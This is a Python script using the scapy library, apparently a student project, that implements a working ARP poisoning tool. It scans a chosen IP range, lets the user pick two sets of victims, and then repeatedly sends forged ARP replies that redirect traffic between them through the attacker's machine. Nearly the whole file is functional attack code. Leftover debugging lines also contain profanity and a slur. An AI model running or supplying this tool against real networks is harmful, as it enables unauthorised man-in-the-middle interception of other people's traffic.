from scapy.all import *

class Tester:

    def __init__(self):
        print("this is fucking weird")

    def method1(self):
        print("IM PRINTING INSIDE A METHOD")

def getMAC(ip):
    return "toast"

#print("testing whether i'm not retarded")
#p1 = Tester()
#p1.method1()

#ans = getMAC("7")
#print(ans)

#the arp poisoning part of the program
print("--=====-- ARP poisoning tool --=====--")
time.sleep(0.5)

print("Available interfaces: ")
# get the list of available interfaces and print them
available_interfaces = get_if_list()
print(available_interfaces)
#user enters which interface to use
interface = raw_input("Select the interface that you want to use: ")

#user enters what IP range to use
ip_range = raw_input("Enter the range of IP addresses that you want to use (example: 192.168.5.85/24): ")

#sends ARP packets to all ips in the range, -> we now know which ips are taken, and the MAC-address corresponding with every IP
ips_used, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = ip_range), timeout=3, iface=interface)

#print all taken ip addresses so that the user can select a target
print("We received the following responses: ")
index = 0
print(" \t\t IP: \t MAC:")
for packet_sent, packet_received in ips_used:
    print("{} \t {} \t {}".format(index, packet_received[ARP].psrc, packet_received[ARP].hwsrc))
    index = index + 1

target = []
#now we will select the targets
mult_target = raw_input("Do you want to select targets manually (y) or select all IP's automatically (n): ")
#case user manually selects targets
if(mult_target == "y"):
    print("Enter the index nr of the targets you want to add to the target list, to quit entering input 'quit'")
    input = ""
    while(input != "quit"):
        input = raw_input()
        if(input != "quit"):
            inputInt = int(input)
            target.append({"ip": ips_used[inputInt][1][ARP].psrc, "mac": ips_used[inputInt][1][ARP].hwsrc})
else:
    for packet_sent, packet_received in ips_used:
        target.append({"ip": packet_received[ARP].psrc, "mac": packet_received[ARP].hwsrc})
#print(target)

target2 = []
#now we will select the target2
mult_target = raw_input("Do you want to select target2 manually (y) or select all IP's automatically (n): ")
#case user manually selects target2
if(mult_target == "y"):
    print("Enter the index nr of the target you want to add to the target2 list, to quit entering input 'quit'")
    input = ""
    while(input != "quit"):
        input = raw_input()
        if(input != "quit"):
            inputInt = int(input)
            target2.append({"ip": ips_used[inputInt][1][ARP].psrc, "mac": ips_used[inputInt][1][ARP].hwsrc})
else:
    for packet_sent, packet_received in ips_used:
        target2.append({"ip": packet_received[ARP].psrc, "mac": packet_received[ARP].hwsrc})
#print(host)

#start the actual proofing
print("Now we will start the ARP poisoning")
#mac address of the attacker
ownMAC = get_if_hwaddr(interface)

#now we will create the ARP packets which will poison the targets. We will assume for now that it is bidirection poisoning
try:
    while True:
        for tar1 in target:
            for tar2 in target2:
                if((tar1["ip"] != tar2["ip"]) and (tar1["mac"] != tar2["mac"])):
                    arp_packet1 = Ether(src=ownMAC) / ARP(psrc=tar2["ip"], hwsrc=ownMAC, pdst=tar1["ip"], hwdst=tar1["mac"]) 
                    sendp(arp_packet1, iface=interface)
                    arp_packet2 = Ether(src=ownMAC) / ARP(psrc=tar1["ip"], hwsrc=ownMAC, pdst=tar2["ip"], hwdst=tar2["mac"])
                    sendp(arp_packet2, iface=interface)
        #waits 20 seconds before the next spoof
        time.sleep(20)
#cancel the arp poisonining by pressing ctrl c
except KeyboardInterrupt:
    print("spoofing cancelled")

